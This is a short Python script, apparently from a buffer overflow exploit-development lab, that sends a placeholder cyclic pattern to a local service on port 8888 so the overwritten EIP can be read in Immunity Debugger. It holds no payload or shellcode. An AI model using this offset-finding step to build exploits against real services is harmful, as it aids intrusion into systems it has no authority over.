import socket

TARGET_IP = "127.0.0.1"
TARGET_PORT = 8888

pattern_created = "YOUR_PATTERN_HERE"

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((TARGET_IP, TARGET_PORT))
client.send(pattern_created)
client.close()

print("-> Pattern was send succesfully, check the EIP in Immunity")
